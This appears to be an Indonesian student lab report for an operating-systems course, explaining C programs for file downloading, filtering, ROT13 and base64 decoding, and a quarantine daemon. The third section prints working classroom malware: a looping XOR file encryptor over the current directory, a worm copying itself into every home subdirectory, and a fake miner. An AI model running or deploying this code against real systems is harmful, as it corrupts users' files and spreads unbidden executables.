# Soal 1
Dikerjakan oleh Ahmad Ibnu Athaillah/5027241024

import library
```
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>
#include <string.h>
#include <dirent.h>
#include <ctype.h>
Ini semacam alat-alat bantu dari C yang udah disediain. Buat kerjaan file, folder, teks, dan sistem.
```
decleare Konstanta
```
#define ZIP_NAME "Clues.zip"
#define CLUES_DIR "Clues"
#define FILTERED_DIR "Filtered"
#define GDRIVE_ID "1xFn1OBJUuSdnApDseEczKhtNzyGekauK"
```
bikin nama panggilan biar nggak ngetik panjang-panjang tiap kali mau manggil file atau folder.

Deklarasi Fungsi
```
void download_and_extract();
int is_valid_filename(const char *name);
void traverse_and_filter(const char *base_path);
void filter_files();
```
Ini bagian “peta-nya”. Nunjukin bakal ada fungsi-fungsi itu nanti. Belum diisi isinya.

```
download_and_extract()
```
Cek dulu folder Clues udah ada belum. Kalau belum, download file zip dari Google Drive, terus di-unzip. File zip-nya langsung dihapus abis diekstrak. Kalo udah ada? Ya skip aja.

```
is_valid_filename()
```
Cek nama file apakah cocok sama format yang dimau, yaitu kayak A.txt, 9.txt, dsb. Panjangnya harus 5 karakter.

```
traverse_and_filter(base_path)
```
Masuk ke semua folder yang ada dalam Clues/. Kalo nemu file valid, pindahin ke folder Filtered/. Kalo nggak valid? Dihapus.

```
filter_files()
```
Ini cuma manggil traverse_and_filter() dari luar, biar clean. Buat ngejalanin filter secara keseluruhan.

```
compare_numeric() & compare_alpha()
```
Buat ngurut file. Yang satu berdasarkan angka, satunya huruf. Dipake waktu gabungin file.

```
combine_files()
```
Gabungin isi file dari folder Filtered. Diurut dulu: yang angkanya dulu, baru huruf. Hasilnya digabung 1 karakter dari setiap file, disimpan ke Combined.txt. File aslinya dihapus satu-satu.

```
rot13()
```
Nge-decode teks pake cara ROT13 (tuker huruf A jadi N, B jadi O, dst). Ini semacam sandi.

```
decode_file()
```
Ambil file Combined.txt, terus decode isinya pakai ROT13. Hasilnya disimpan di Decoded.txt.

```
main()
```
kalo ga pake argumen, otomatis download & ekstrak. Tapi kalo dijalanin kayak:

```
```./action -m Filter``` → ngefilter file

```./action -m Combine``` → gabungin file

```./action -m Decode ```→ decode hasil gabungannya


yang peerlu digaris bawahi:

```
system("gdown...") & system("unzip..."):``` Ini nyuruh komputer jalanin command terminal dari dalam program. Harus hati-hati, bisa bahaya kalau isinya gak aman.

```strdup():``` Ini fungsi buat ngopi string ke memori baru, tapi kudu di-free() lagi biar gak bocor memori.

cara run program

# Buat download dan ekstrak
```./action```

# Buat filter file
```./action -m Filter```

# Buat gabungin file
```./action -m Combine```

# Buat decode file gabungan
```./action -m Decode```
Hasil Akhir
```Filtered/:``` isinya file yang valid aja

```Combined.txt:``` gabungan karakter pertama dari tiap file

```Decoded.txt```: isi dari Combined.txt tapi udah didecode

#skrip lengkap
```
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>
#include <string.h>
#include <dirent.h>
#include <ctype.h>
#define ZIP_NAME "Clues.zip"
#define CLUES_DIR "Clues"
#define FILTERED_DIR "Filtered"
#define GDRIVE_ID "1xFn1OBJUuSdnApDseEczKhtNzyGekauK"

void download_and_extract();
int is_valid_filename(const char *name);
void traverse_and_filter(const char *base_path);
void filter_files();

void download_and_extract() {
    struct stat st;

    if (stat(CLUES_DIR, &st) == 0 && S_ISDIR(st.st_mode)) {
        printf("Ingpo File e wes onok mas e!!! SKIP!!!.\n");
        return;
    }

    printf("ngedonwload file zip\n");
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "gdown --id %s -O %s", GDRIVE_ID, ZIP_NAME);
    int ret = system(cmd);
    if (ret != 0) {
        printf("Barakallah Tuhan Memberkati\n");
        return;
    }

    printf("Lagi ngeekstrak file zip\n");
    snprintf(cmd, sizeof(cmd), "unzip -q %s -d %s", ZIP_NAME, CLUES_DIR);
    ret = system(cmd);
    if (ret != 0) {
        printf("aku gagal...maafkan diriku\n");
        return;
    }

    remove(ZIP_NAME);
    printf("File Clue udh nongol\n");
}

int is_valid_filename(const char *name) {
    size_t len = strlen(name);
    return (len == 5 && isalnum(name[0]) && strcmp(name + 1, ".txt") == 0);
}

void traverse_and_filter(const char *base_path) {
    DIR *d = opendir(base_path);
    if (!d) return;

    struct dirent *dir;
    while ((dir = readdir(d)) != NULL) {
        if (strcmp(dir->d_name, ".") == 0 || strcmp(dir->d_name, "..") == 0)
            continue;

        char path[512];
        snprintf(path, sizeof(path), "%s/%s", base_path, dir->d_name);

        if (dir->d_type == DT_DIR) {
            traverse_and_filter(path);
        } else if (dir->d_type == DT_REG) {
            if (is_valid_filename(dir->d_name)) {
                mkdir(FILTERED_DIR, 0755);
                char dest[512];
                snprintf(dest, sizeof(dest), "%s/%s", FILTERED_DIR, dir->d_name);
                rename(path, dest);
            } else {
                remove(path);
            }
        }
    }
    closedir(d);
}

void filter_files() {
    traverse_and_filter(CLUES_DIR);
    printf("Ngefilter selesai.\n");
}

int compare_numeric(const void *a, const void *b) {
    int num1 = atoi(*(const char **)a);
    int num2 = atoi(*(const char **)b);
    return num1 - num2;
}

int compare_alpha(const void *a, const void *b) {
    return strcmp(*(const char **)a, *(const char **)b);
}

void combine_files() {
    DIR *d = opendir(FILTERED_DIR);
    if (!d) {
        printf("Ga nemu file filter anjay\n");
        return;
    }

    struct dirent *dir;
    char *num_files[1000];
    char *alpha_files[1000];
    int num_count = 0, alpha_count = 0;

    while ((dir = readdir(d)) != NULL) {
        if (strcmp(dir->d_name, ".") == 0 || strcmp(dir->d_name, "..") == 0)
            continue;

        if (strlen(dir->d_name) == 5 && dir->d_name[1] == '.' && dir->d_name[2] == 't') {
            if (isdigit(dir->d_name[0])) {
                num_files[num_count++] = strdup(dir->d_name);
            } else if (isalpha(dir->d_name[0])) {
                alpha_files[alpha_count++] = strdup(dir->d_name);
            }
        }
    }
    closedir(d);

    qsort(num_files, num_count, sizeof(char *), compare_numeric);
    qsort(alpha_files, alpha_count, sizeof(char *), compare_alpha);

    FILE *out = fopen("Combined.txt", "w");
    if (!out) {
        perror("fopen");
        return;
    }

    int i = 0, j = 0;
    while (i < num_count || j < alpha_count) {
        if (i < num_count) {
            char path[256];
            snprintf(path, sizeof(path), "%s/%s", FILTERED_DIR, num_files[i]);
            FILE *f = fopen(path, "r");
            if (f) {
                int c = fgetc(f);
                if (c != EOF) fputc(c, out);
                fclose(f);
                remove(path);
            }
            free(num_files[i++]);
        }
        if (j < alpha_count) {
            char path[256];
            snprintf(path, sizeof(path), "%s/%s", FILTERED_DIR, alpha_files[j]);
            FILE *f = fopen(path, "r");
            if (f) {
                int c = fgetc(f);
                if (c != EOF) fputc(c, out);
                fclose(f);
                remove(path);
            }
            free(alpha_files[j++]);
        }
    }

    fclose(out);
    printf("file combine udh jadi\n");
}

void rot13(char *str) {
    for (int i = 0; str[i]; i++) {
        if (str[i] >= 'A' && str[i] <= 'Z')
            str[i] = (str[i] - 'A' + 13) % 26 + 'A';
        else if (str[i] >= 'a' && str[i] <= 'z')
            str[i] = (str[i] - 'a' + 13) % 26 + 'a';
    }
}

void decode_file() {
    FILE *in = fopen("Combined.txt", "r");
    if (!in) {
        printf("sek bentar gagal buka combine\n");
        return;
    }

    FILE *out = fopen("Decoded.txt", "w");
    if (!out) {
        printf("njir ga bisa decode\n");
        fclose(in);
        return;
    }

    char buffer[1024];
    while (fgets(buffer, sizeof(buffer), in)) {
        rot13(buffer);
        fputs(buffer, out);
    }

    fclose(in);
    fclose(out);
    printf("file decode udh dibuat dari BrainRot13\n");
}

int main(int argc, char *argv[]) {
    if (argc == 1) {

        download_and_extract();
    } else if (argc == 3 && strcmp(argv[1], "-m") == 0) {
        if (strcmp(argv[2], "Filter") == 0) {
           
            filter_files();
        } else if (strcmp(argv[2], "Combine") == 0) {
  
            combine_files();
        } else if (strcmp(argv[2], "Decode") == 0) {

            decode_file();
        } else {
            printf("Usage:\n");
            printf("  ./action               # donwload & extract zip\n");
            printf("  ./action -m Filter     # filter itunya\n");
            printf("  ./action -m Combine    # ngegabung isi filter ke combine\n");
            printf("  ./action -m Decode     # ngedecode pake brainROT13\n");
        }
    } else {
        printf("Usage:\n");
        printf("  ./action               # untuk download & ekstrak zip\n");
        printf("  ./action -m Filter     # filter itunya\n");
        printf("  ./action -m Combine    # ngegabung isi filter ke combine\n");
        printf("  ./action -m Decode    # ngedecode pake brainROT13\n");
    }

    return 0;
}
```
# Soal 2

Dikerjakan oleh I Gede Bagus Saka Sinatrya/5027241088

## a. Mendownload dan Unzip File kemudian di file zip di hapus.

Untuk mendownload secara otomatis kita membuat terlebih dahulu shell script dengan nama starterkit.c kemudian membuat fungsi untuk mendonwload menggunakan
```bash
void download_zip() {
    if (access(STARTER_ZIP, F_OK) == 0) {
        printf("ZIP file already exists.\n");
        return;
    }

    printf("Downloading ZIP...\n");
    pid_t pid = fork();
    if (pid == 0) {
        execlp("wget", "wget", "-O", STARTER_ZIP, ZIP_URL, (char *)NULL);
        perror("wget failed");
        exit(1);
    } else {
        int status;
        waitpid(pid, &status, 0);
        if (!(WIFEXITED(status) && WEXITSTATUS(status) == 0)) {
            fprintf(stderr, "Download failed.\n");
            exit(1);
        }
    }
}
```
- `access(filename, F_OK)` fungsi ini akan mengecek apakah file dengan nama filename sudah ada.
- `F_OK`mengecek apakah file ada, jika sudah ada makan akan di return jika tidak ada maka akan memulai proses download.
- `pid_t` tipe data untuk menyimpan proses id.
- `(pid= == 0)` menjalankan di child process.
- `execlp` digunakan untuk menjalankan `wget`.
- `"-O", STARTER_ZIP` menyimpan file ke starterkit.zip.
- `ZIP_URL` link unduhan.
- `perror()` menampilkan pesan error jika gagal.
- `waitpid(pid, &status, 0)` menunggu child process selesai.
- `WIFEXITED(status)` mengecek apakah child process selesai dengan normal.
- `WEXITSTATUS(status) == 0)` mengambil exit code dari child process.

Untuk melakukan unzip dapat menggunakan fungsi 
```bash
void unzip_zip() {
    int err = 0;
    struct zip *z = zip_open(STARTER_ZIP, 0, &err);
    if (!z) {
        fprintf(stderr, "Failed to open zip file.\n");
        return;
    }

    mkdir(STARTER_DIR, 0755);

    for (zip_int64_t i = 0; i < zip_get_num_entries(z, 0); i++) {
        struct zip_stat st;
        zip_stat_index(z, i, 0, &st);

        char filepath[BUFFER_SIZE];
        snprintf(filepath, sizeof(filepath), "%s/%s", STARTER_DIR, st.name);

        FILE *f = fopen(filepath, "wb");
        if (!f) continue;

        struct zip_file *zf = zip_fopen_index(z, i, 0);
        char buf[BUFFER_SIZE];
        zip_int64_t len;
        while ((len = zip_fread(zf, buf, BUFFER_SIZE)) > 0) {
            fwrite(buf, 1, len, f);
        }

        fclose(f);
        zip_fclose(zf);
    }

    zip_close(z);
    remove(STARTER_ZIP);
}
```
- `zip_open` untuk membuka file zip tang tertera.
- `0` membaca zip.
- `&err` menyimpan error jika gagal membuka zip.
- `if (!z)`mengecek apakah zip berhasil di buka.
- `mkdir(STARTER_DIR, 0755)` membuat folder dan memberikan akses.
- `zip_get_num_entries` mendapatkan jumlah total entri yang ada di file.
- `struct zip_stat` menyimpan data.
- `zip_stat_index` mengisi struktur dengan data dari indeks i dalam zip.
- `char filepath[BUFFER_SIZE]` menyimpan path lengkap file hasil ektraksi.
- `snprintf` membuat path lengkap dengan format yang sudah ditentukan.
- `fopen(filepath, "wb")` membuka file di lokasi filepath dalam mode write binary.
- ` if (!f) continue` jika gagal akan melanjutkan ke file berikutnya.
- `zip_fopen_index` membuka file dalam zip berdasarkan indeksnya.
- `char buf[BUFFER_SIZE]` menyimpan data sementara.
- `zip_fread` membaca isi file dari ZIP ke buffer.
- `fwrite` menulis data dari buffer ke  file ekstraksi.
- `fclose` menutup file hasil ekstraksi.
- `zip_fclose` menutup file di dalam ZIP.
- `zip_close` menutup file ZIP.
- ` remove(STARTER_ZIP)` menghapus file ZIP setelah berhasil di ekstrak.

## b. Membuat sebuah directory karantina yang dapat mendecrypt nama file

Fungsi yang digunakan
```bash
void decrypt_files() {
    FILE *pf = fopen("daemon.pid", "w");
    if (pf) {
        fprintf(pf, "%d\n", getpid());
        fclose(pf);
    }

    mkdir(QUARANTINE_DIR, 0755);
    note_log("Successfully started decryption process with PID %d", getpid());

    while (1) {
        DIR *d = opendir(STARTER_DIR);
        struct dirent *f;
        if (!d) {
            sleep(2);
            continue;
        }

        while ((f = readdir(d))) {
            if (strcmp(f->d_name, ".") == 0 || strcmp(f->d_name, "..") == 0) continue;

            char clean[BUFFER_SIZE];
            strncpy(clean, f->d_name, BUFFER_SIZE);
            clean_filename(clean);

            if (!is_base64(clean)) {
                continue;
            }

            char decoded[BUFFER_SIZE];
            decode_base64(clean, decoded);
            decoded[strcspn(decoded, "\n\r")] = '\0';

            if (!is_printable(decoded)) {
                note_log("%s - Skipped: decoded name contains non-printable characters.", clean);
                continue;
            }

            char src[BUFFER_SIZE], dst[BUFFER_SIZE];
            snprintf(src, sizeof(src), "%s/%s", STARTER_DIR, f->d_name);
            snprintf(dst, sizeof(dst), "%s/%s", QUARANTINE_DIR, decoded);
            move_file(src, dst, "decrypted and quarantined");
        }

        closedir(d);
        sleep(2);
    }
}
```
Penjelasan mengenai kode
```bash
 FILE *pf = fopen("daemon.pid", "w");
    if (pf) {
        fprintf(pf, "%d\n", getpid());
        fclose(pf);
    }
```
- Menyimpan PID ke dalam file daemon.pid untuk sementara.
- `getpid` mengambil PId dari proses yang sedang berjalan.

```bash
mkdir(QUARANTINE_DIR, 0755);
note_log("Successfully started decryption process with PID %d", getpid());
```
- Membuat direktori Quarantine jika belum ada dan memberikan akses.
- `note_log` meneruskan ke fungsi note_log jika proses berhasil.

```bash
while (1) {
        DIR *d = opendir(STARTER_DIR);
        struct dirent *f;
        if (!d) {
            sleep(2);
            continue;
        }
```
- Melakukan pemrosesan berulang untuk terus memeriksa file baru di starter_kit.
- `opendir` membuka direktori starter_kit, jika direktori tidak tersedia atau error daemon akan menunggu 2 detik sebelum mencoba lagi.

```bash
while ((f = readdir(d))) {
            if (strcmp(f->d_name, ".") == 0 || strcmp(f->d_name, "..") == 0) continue;
```
- Mengecek semua file dalam direktori yang dtentukan, dan menghindari karakter khusus `"."` dan ".." untuk menghidari error.

```bash
 char clean[BUFFER_SIZE];
            strncpy(clean, f->d_name, BUFFER_SIZE);
            clean_filename(clean);
```
- Membersihkan namafile dengan memanggil fungsi clean_filename.
  
```bash
 if (!is_base64(clean)) {
                continue;
            }
```
- Mengecek apakah nama file di enkripsi dengan Base64, jika tidak file dilewati dan proses di lanjut.

```bash
 char decoded[BUFFER_SIZE];
            decode_base64(clean, decoded);
            decoded[strcspn(decoded, "\n\r")] = '\0';
```
- Mendeskripsikan nama file yang dienkripsi menggunakan algoritma Base64 dan membersihkan dari karakter yang tidak termasuk Base64.

```bash
if (!is_printable(decoded)) {
                note_log("%s - Skipped: decoded name contains non-printable characters.", clean);
                continue;
            }
```
- Memastikan nama file hasil deskripsi mengandung karakter yang dapat di print. 

```bash
char src[BUFFER_SIZE], dst[BUFFER_SIZE];
            snprintf(src, sizeof(src), "%s/%s", STARTER_DIR, f->d_name);
            snprintf(dst, sizeof(dst), "%s/%s", QUARANTINE_DIR, decoded);
            move_file(src, dst, "decrypted and quarantined");
```
- Memindahkan file ke direktori karantina.

Fungsi pendukung yang dipanggil untuk memastikan saat melakukan decrypt

```bash
void clean_filename(char *str) {
    size_t len = strlen(str);
    while (len > 0 && (str[len - 1] == '\n' || str[len - 1] == '\'' || str[len - 1] == '\r'))
        str[--len] = '\0';
    if (str[0] == '\'') memmove(str, str + 1, len);
}
```
- Fungsi ini akan memberhihkan nama file dari karakter yang tidak dinginkan seperti `\n`, `\r`,`(')`.
- strlen(str) menghitung panjang string. yang nantinya akan disimpan di variabel `len` yang bertipe `size_t`.
- `str[len - 1]` mengacu pada karakter terakhir dari string kemudian melakukan loop untuk mengecek karakter.
- `str[--len] = '\0'` mengurangi nilai len sebanyak satu dan mengganti karakter terakhir yang tidak diinginkan dengan karakter null.
- `str[0] == '\''` mengecek apakah karakter pertama dalam string adalah tanda kutip tunggal.
- `memmove(str, str + 1, len)` memindahkan seluruh isi string ke kiri sebanyak satu karakter dan menghapus tanda kutip, `str + 1` menunjuk ke elemen kedua dari string, `len` jumlah byte yang akan dipindahkan.

```bash
int base64_value(char c) {
    if ('A' <= c && c <= 'Z') return c - 'A';
    if ('a' <= c && c <= 'z') return c - 'a' + 26;
    if ('0' <= c && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}
```
- Mengecek apakah nama file sudah sesuai dengan algoritma Base64

```bash
void decode_base64(const char *in, char *out) {
    int buffer = 0, bits = 0, len = 0;
    for (int i = 0; in[i] && in[i] != '='; i++) {
        int val = base64_value(in[i]);
        if (val == -1) continue;
        buffer = (buffer << 6) | val;
        bits += 6;
        if (bits >= 8) {
            bits -= 8;
            out[len++] = (buffer >> bits) & 0xFF;
        }
    }
    out[len] = '\0';
}
```
- Mengubah setiap karakter Base64 menjadi nilai integer.
- `in[i]` mengecek apakah karakter tersebut `in[i]` ada atau tidak.
- `in[i] != '='` mengecek apakah karakter tersebut bukan karakter `=`, yang biasanya muncul di akhir Base64.
- `base64_value(in[i])` mengubah karakterBase64 menjadi nilai integer sesuai dengan Base64 dan akan melewati karakter tidak valid dan lanjut ke karakter berikutnya.
- `out[len] = '\0'` menambahkan karakter NULL di akhir output untuk memastikan bahwa hasil decode adalah stirng yang valid.

```bash
int is_base64(const char *str) {
    int len = strlen(str);
    if (len % 4 != 0) return 0;
    for (int i = 0; i < len; i++) {
        if (!(isalnum(str[i]) || str[i] == '+' || str[i] == '/' || str[i] == '=')) {
            return 0;
        }
    }
    return 1;
}
```
- Mengecek apakah sebuah stirng adalah Base64 yang valid
- `if (len % 4 != 0) return 0` mengecek apakah panjang stirng keliapatan 4 jika tidak akan langsung mereturn 0.
- `isalnum` harus berupa huruf atau angka.
- Jika semua syarat sudah terpenuhi makan akan langsung mereturn satu.

```bash
int is_printable(const char *str) {
    for (int i = 0; str[i]; i++) {
        if (!isprint((unsigned char)str[i])) return 0;
    }
    return 1;
}
```
- Mengecek apakah semua karakter dapat ditampilkan di terminal.
- `isprint` mengecek apakah sebuah karakter termasuk printable karakter.

```bash
void move_file(const char *from, const char *to, const char *action) {
    if (rename(from, to) == 0) {
        char *filename = strrchr(to, '/');
        note_log("%s - Successfully %s", filename ? filename + 1 : to, action);
    } else {
        note_log("Failed to move %s → %s: %s", from, to, strerror(errno));
    }
}
```
- Memindahkan file dari suatu folder ke folder yang lain.
- `rename()` Memindahkan atau mengganti nama file.
- Fungsi `strrchr()` mencari kemunculan terakhir karakter `/` di string to.
- `strerror(errno)` mendapatkan pesan error dari sistem.

## c. Memindahkan file yang ada pada directory starter kit ke directory karantina, dan begitu juga sebaliknya

Dalam memindahkan semua file dapa menggunakan fungsi berikut.
```bash
void move_all(const char *from, const char *to, const char *action) {
    DIR *d = opendir(from);
    struct dirent *f;
    if (!d) return;

    while ((f = readdir(d))) {
        if (strcmp(f->d_name, ".") == 0 || strcmp(f->d_name, "..") == 0) continue;

        char src[BUFFER_SIZE], dst[BUFFER_SIZE];
        snprintf(src, sizeof(src), "%s/%s", from, f->d_name);
        snprintf(dst, sizeof(dst), "%s/%s", to, f->d_name);
        move_file(src, dst, action);
    }

    closedir(d);
}
```
- `opendir()` membuka direktori tempat file berasal. 
- `if (!d) return` kalau gagal makan akan langsung keluar dari fungsi.
- `readdir()` membaca entri satu persatu dari direktori.
- Jika proses sudah sesuai maka akan memanggil fungsi `move_file()`.

## d. Fitur menghapus seluruh file yang ada di dalam directory karantina

```bash
void delete_all(const char *dir) {
    DIR *d = opendir(dir);
    struct dirent *f;
    if (!d) return;

    while ((f = readdir(d))) {
        if (strcmp(f->d_name, ".") == 0 || strcmp(f->d_name, "..") == 0) continue;
        char path[BUFFER_SIZE];
        snprintf(path, sizeof(path), "%s/%s", dir, f->d_name);
        if (remove(path) == 0) {
            note_log("%s - Successfully deleted", f->d_name);
        }
    }

    closedir(d);
}
```
- `remove()` menghapus file.
- Jika sudah berhasil maka akan di cata le dalam note_log.

## e. Fitur untuk mematikan PID proccess

```bash
void shutdown() {
    FILE *fp = fopen("daemon.pid", "r");
    if (!fp) {
        fprintf(stderr, "PID file not found.\n");
        return;
    }

    pid_t pid;
    fscanf(fp, "%d", &pid);
    fclose(fp);

    if (kill(pid, SIGTERM) == 0) {
        printf("Daemon with PID %d ended.\n", pid);
        note_log("Successfully shut off decryption process with PID.", pid);
        remove("daemon.pid");
    } else {
        perror("Failed to ended daemon");
    }
}
```
- `fopen()` membuka file daemon.pid yang berisi PID saat menjalankan proses awal.
- `fscanf(fp, "%d", &pid);` memnaca angka dari file dan menyimpannya di variabel pid.
- `kill()` mengirim sinyal ke proses dengan ID pid.
- `SIGTERM` sinyal untuk meminta proses berhenti secara sopan.
- `remove()` menghapus daemon.pid jika sudah selesai digunakan.

## f. Menambhakan error handling sederhana

fungsi urtama dari porgram ini 
```bash
int main(int argc, char *argv[]) {
    mkdir(STARTER_DIR, 0755);
    mkdir(QUARANTINE_DIR, 0755);

    if (argc < 2) {
        download_zip();
        unzip_zip();
        printf("Starter kit is ready. Run ./starterkit --decrypt\n");
        return 0;
    }

    if (strcmp(argv[1], "--decrypt") == 0) {
        pid_t pid = fork();
        if (pid == 0) {
            decrypt_files();
        } else {
            printf("Decryption daemon started with PID %d\n", pid);
        }
    } else if (strcmp(argv[1], "--quarantine") == 0) {
        move_all(STARTER_DIR, QUARANTINE_DIR, "moved to quarantine directory");
    } else if (strcmp(argv[1], "--return") == 0) {
        move_all(QUARANTINE_DIR, STARTER_DIR, "returned to starter_kit directory");
    } else if (strcmp(argv[1], "--eradicate") == 0) {
        delete_all(QUARANTINE_DIR);
    } else if (strcmp(argv[1], "--shutdown") == 0) {
        shutdown();
    } else {
        fprintf(stderr, "Unknown command: %s\n", argv[1]);
        fprintf(stderr, "Usage: ./starterkit [--decrypt | --quarantine | --return | --eradicate | --shutdown]\n");
    }

    return 0;
}
```
- Jika file dijalankan ddengan `./starterkit` maka akan mendownload dan langsung mengekstrak zip. Jika benar makan akan muncul tulisan pemberitahuan.
- Kalau user mengetik `./starterkit --decrypt` program memanggil fork() untuk membuat child process dan akan menjalannkan decrypt files.
- Setelah itu kita dapat memilih utnuk menjalankan perinta mana yang kita inginkan.
- Terdapat juga beberapa pesan error jika kita salah dalam memasukkan perintah untuk menjalankan program.

## g. Mencatat semua peggunaan program

```bash
void note_log(const char *format, ...) {
    FILE *log = fopen(LOG_FILE, "a");
    if (!log) return;

    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    char timetotal[64];
    strftime(timetotal, sizeof(timetotal), "[%d-%m-%Y][%H:%M:%S]", t);
    fprintf(log, "%s - ", timetotal);

    va_list args;
    va_start(args, format);
    vfprintf(log, format, args);
    va_end(args);

    fprintf(log, "\n");
    fclose(log);
}
```
- `time_t now = time(NULL)` mengambil waktu sekarang dalam format timestamp.
- `struct tm *t = localtime(&now)` mengubah menjadi waktu lokal.
- `strftime(timetotal, sizeof(timetotal), "[%d-%m-%Y][%H:%M:%S]", t)` mengubah waktu dari struct `tm` ke string.
- `va_list args` mendeklarasikan variabel untuk menampung argumen tambahan.
- `va_start(args, format)` memulai pembacaan argumen setelah format.
- `vfprintf(log, format, args)` menuliskan format dan isi argumen ke file
- `va_end(args)` membersihkan memori variadic.

## Beberapa Error yang terjadi

![Image](https://github.com/user-attachments/assets/484890e6-1705-492e-bb38-876d8edf246c)
- Penyebabnya adalah karena pada fungsi donwload zip sebelumnya belum menggunakan execlp sehingga fungsi tidak bisa membaca link yang tertera dari google drive.

![Image](https://github.com/user-attachments/assets/a9607993-6827-4fbe-ab70-5200f88b1637)
- Penyebabnya karena file tersebut masih terdapat karakter yang tidak termasuk ke dalam algoritma base64 sehingga file di lewati, maka dari itu untuk mengatasinya kita membuat fungsi clean_filename untuk menghilangkan karakter yang tidak diinginkan tersebut.
- Karena karakter itu juga, maka pada saat melakukan decrypt tidak semua file berhasil di decrypt dan dipindahkan ke folder quarantine.

# Soal 3
dikerjakan oleh Muhammad Ahsani Taqwiim Rakhman (5027241099) 

- 1. `wannacryptor` mengenkripsi file secara rekursif menggunakan XOR.
- 2. `trojan_wrm` menyalin biner malware ke direktori lain.
- 3. `rodok.exe` fork "miners" yang mensimulasikan penambangan kripto dengan menghasilkan hash acak.
  
Library
```bash
#include <stdio.h>        
#include <stdlib.h>       
#include <unistd.h>       
#include <sys/types.h>    
#include <sys/wait.h>     
#include <string.h>      
#include <time.h>         
#include <sys/stat.h>     
#include <fcntl.h>        
#include <dirent.h>      
#include <errno.h>       
#include <signal.h>       
#include <sys/prctl.h>    
```
`#include <stdio.h>`: untuk menginput dan output
`#include <stdlib.h>`:Memory allocation, exit()
`#include <unistd.h>`:Forking, file operations
`#include <sys/types.h>`:pid_t, size_t, etc.
`#include <sys/wait.h>`:wait()
`#include <string.h>`:String
`#include <time.h> `:time(), strftime()
`#include <sys/stat.h>`:File info (stat)
`#include <fcntl.h>`:open, read, write
`#include <dirent.h>`:Penjelajahan direktori
`#include <errno.h>`:report Error
`#include <signal.h>`:Signal
`#include <sys/prctl.h>`:prctl() untuk proses penamaan

##wannacryptor
xor_encrypt
```bash
void xor_encrypt_file(const char *path, unsigned char key) {
    FILE *file = fopen(path, "rb");
    if (!file) return;

    fseek(file, 0, SEEK_END);
    long size = ftell(file);
    rewind(file);

    unsigned char *data = malloc(size);
    if (!data) {
        fclose(file);
        return;
    }

    fread(data, 1, size, file);
    fclose(file);

    for (long i = 0; i < size; i++) {
        data[i] ^= key;
    }

    file = fopen(path, "wb");
    if (file) {
        fwrite(data, 1, size, file);
        fclose(file);
    }

    free(data);
}
```
- `FILE *file = fopen(path, "rb");` membuka file untuk dibaca
- ` fread(data, 1, size, file);
    fclose(file);` membaca semua konten file ke dalam memori
- `for (long i = 0; i < size; i++) {
        data[i] ^= key;
    }` Meng-XOR-kan setiap byte dengan key.
- `file = fopen(path, "wb");
    if (file) {
        fwrite(data, 1, size, file);
        fclose(file);
    }` Menuliskan kembali konten terenkripsi ke dalam file.

  Encrypt_directory
  ```bash
  void encrypt_directory(const char *dir_path, unsigned char key) {
    DIR *dir = opendir(dir_path);
    if (!dir) return;

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        char full_path[512];
        snprintf(full_path, sizeof(full_path), "%s/%s", dir_path, entry->d_name);

        struct stat st;
        if (stat(full_path, &st) == 0) {
            if (S_ISREG(st.st_mode)) {
                xor_encrypt_file(full_path, key);
            } else if (S_ISDIR(st.st_mode)) {
                encrypt_directory(full_path, key);
            }
        }
    }

    closedir(dir);
  }
  ```
  - `DIR *dir = opendir(dir_path);` membuka directory
  - `if (S_ISREG(st.st_mode)) { 
                xor_encrypt_file(full_path, key);  ` jika file reguler maka akan diencrypt
  -  `else if (S_ISDIR(st.st_mode)) { 
                encrypt_directory(full_path, key);  ` jika itu directory maka akan di recurse
  
  Wannacryptor
  ```bash
  void wannacryptor() {
    prctl(PR_SET_NAME, "wannacryptor");
    while (1) {
        unsigned char key = (unsigned char)(time(NULL) & 0xFF);
        char cwd[256];
        getcwd(cwd, sizeof(cwd));
        encrypt_directory(cwd, key);
        sleep(30);
    }
  }
   ```
  - Mendapatkan direktori saat ini menggunakan `getcwd()`.

- Menggunakan key XOR sederhana yang berasal dari `time()` saat ini.

- Memanggil `encrypt_directory()` untuk mengenkripsi secara rekursif.

- Tidur selama 30 detik sebelum mengulang.
  
##trojan.wrm
```bash
void trojan_wrm() {
    prctl(PR_SET_NAME, "trojan.wrm");
    char *binary_path = "/proc/self/exe";
    const char *home = getenv("HOME");
    if (!home) return;

    while (1) {
        DIR *dir = opendir(home);
        if (!dir) return;

        struct dirent *entry;
        while ((entry = readdir(dir)) != NULL) {
            if (entry->d_type == DT_DIR && strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
                char target_path[512];
                snprintf(target_path, sizeof(target_path), "%s/%s/runme", home, entry->d_name);

                int src_fd = open(binary_path, O_RDONLY);
                int dst_fd = open(target_path, O_WRONLY | O_CREAT | O_TRUNC, 0755);

                if (src_fd >= 0 && dst_fd >= 0) {
                    char buffer[4096];
                    ssize_t n;
                    while ((n = read(src_fd, buffer, sizeof(buffer))) > 0) {
                        write(dst_fd, buffer, n);
                    }
                    close(src_fd);
                    close(dst_fd);
                }
            }
        }
        closedir(dir);
        sleep(30);
    }
}
```
- Mendapatkan jalur binernya sendiri `(/proc/self/exe)`.
- Melakukan pengulangan melalui direktori `$HOME`.
- Untuk setiap subdirektori, membuat salinan bernama `runme`.

##rodok.exe
miner.loop
```bash
void miner_loop(int id) {
    char name[32];
    sprintf(name, "mine-crafter-%d", id);
    prctl(PR_SET_NAME, name);

    while (1) {
        int delay = 3 + rand() % 28;
        sleep(delay);

        char hash[65];
        for (int i = 0; i < 64; i++) {
            int r = rand() % 16;
            hash[i] = "0123456789abcdef"[r];
        }
        hash[64] = '\0';

        time_t now = time(NULL);
        struct tm *t = localtime(&now);
        char timestamp[64];
        strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", t);

        FILE *log = fopen("/tmp/.miner.log", "a");
        if (log) {
            fprintf(log, "[%s][Miner %02d] %s\n", timestamp, id, hash);
            fclose(log);
        }
    }
}
```
- `int delay = 3 + rand() % 28;
        sleep(delay);` Sleep secara acak antara 3–30 detik.
- `char hash[65];
        for (int i = 0; i < 64; i++) {
            int r = rand() % 16;
            hash[i] = "0123456789abcdef"[r];
        }
